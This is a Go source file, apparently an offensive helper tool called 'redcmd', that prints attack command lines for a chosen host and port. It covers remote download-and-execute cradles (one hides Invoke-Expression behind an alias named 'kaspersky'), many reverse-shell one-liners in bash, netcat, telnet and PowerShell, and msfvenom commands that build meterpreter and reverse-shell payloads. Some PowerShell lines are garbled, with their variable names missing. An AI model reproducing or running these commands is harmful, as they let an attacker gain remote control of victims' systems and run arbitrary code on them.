package main

import (
	"encoding/base64"
	"fmt"
	"os"
)

func main() {
	mode := os.Args[1]

	switch mode {
	case "download":
		revhost := os.Args[2]
		revport := os.Args[3]
		srcfile := os.Args[4]
		destfile := os.Args[4]

		fmt.Printf("powershell.exe -Command \"Invoke-WebRequest -Uri http://%s:%s/%s -OutFile %s\"\n", revhost, revport, srcfile, destfile)
		fmt.Printf("powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://%s:%s/%s')\n", revhost, revport, srcfile)
		fmt.Printf("certutil.exe -urlcache -split -f http://%s:%s/%s %s\n", revhost, revport, srcfile, destfile)
		fmt.Printf("wget http://%s:%s/%s -O %s\n", revhost, revport, srcfile, destfile)
		fmt.Printf("curl http://%s:%s/%s -o %s\n", revhost, revport, srcfile, destfile)
		fmt.Printf("bitsadmin /rawreturn /transfer down \"http://%s:%s/%s\" c:\\\\%s\n", revhost, revport, srcfile, destfile)
		fmt.Printf("msiexec /q /i http://%s:%s/%s\n", revhost, revport, srcfile)
		fmt.Printf("python -c \"import urllib2; exec urllib2.urlopen('http://%s:%s/%s').read();\"\n", revhost, revport, srcfile)
	case "revshell":
		revhost := os.Args[2]
		revport := os.Args[3]
		base64revshell := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", revhost, revport)
		fmt.Printf("bash -i >& /dev/tcp/%s/%s 0>&1\n", revhost, revport)
		fmt.Printf("/bin/bash -i > /dev/tcp/%s/%s 0<& 2>&1\n", revhost, revport)
		fmt.Printf("exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do  2>&5 >&5; done\n", revhost, revport)
		fmt.Printf("exec /bin/sh 0</dev/tcp/%s/%s 1>&0 2>&0\n", revhost, revport)
		fmt.Printf("0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196\n", revhost, revport)
		fmt.Printf("bash -c {echo,%s}|{base64,-d}|{bash,-i}\n", base64.StdEncoding.EncodeToString([]byte(base64revshell)))
		fmt.Printf("echo \"bash -i >& /dev/tcp/%s/%s 0>&1\"|bash\n", revhost, revport)
		fmt.Printf("sh -i >& /dev/udp/%s/%s 0>&1\n", revhost, revport)
		fmt.Printf("mknod backpipe p && nc %s %s 0<backpipe | /bin/bash 1>backpipe\n", revhost, revport)
		fmt.Printf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n", revhost, revport)
		fmt.Printf("rm -f /tmp/p; mknod /tmp/p p && nc %s %s 0/tmp/p 2>&1\n", revhost, revport)
		fmt.Printf("rm -f x; mknod x p && nc %s %s 0<x | /bin/bash 1>x\n", revhost, revport)
		fmt.Printf("rm -f /tmp/p; mknod /tmp/p p && telnet %s %s 0/tmp/p 2>&1\n", revhost, revport)
		fmt.Printf("rm -f x; mknod x p && telnet %s %s 0<x | /bin/bash 1>x\n", revhost, revport)
		fmt.Printf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%s); = .GetStream();[byte[]] = 0..65535|%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String );  =  + \"PS \" + (pwd).Path + \"> \"; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()\n", revhost, revport)
		fmt.Printf("powershell -nop -c \" = New-Object System.Net.Sockets.TCPClient('%s',%s); = .GetStream();[byte[]] = 0..65535|%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()\"\n", revhost, revport)

	case "msfshell":
		revhost := os.Args[2]
		revport := os.Args[3]
		fmt.Printf("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > reverse.exe\n", revhost, revport)
		fmt.Printf("msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f exe > reverse.exe\n", revhost, revport)
		fmt.Printf("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp > shell.asp\n", revhost, revport)
		fmt.Printf("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf >reverse.elf\n", revhost, revport)
		fmt.Printf("msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f elf >reverse.elf\n", revhost, revport)
		fmt.Printf("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > shell.elf\n", revhost, revport)
		fmt.Printf("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho > shell.macho\n", revhost, revport)
		fmt.Printf("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw > shell.jsp\n", revhost, revport)
		fmt.Printf("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war > shell.war\n", revhost, revport)
		fmt.Printf("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > shell.py\n", revhost, revport)
		fmt.Printf("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > shell.sh\n", revhost, revport)
		fmt.Printf("msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw > shell.pl\n", revhost, revport)

	default:
		fmt.Print("Usage: " +
			"redcmd download 127.0.0.1 8080 shell.exe exploit.exe\n" +
			"	redcmd revshell 127.0.0.1 4444\n" +
			"	redcmd msfshell 127.0.0.1 4444\n")
	}
}
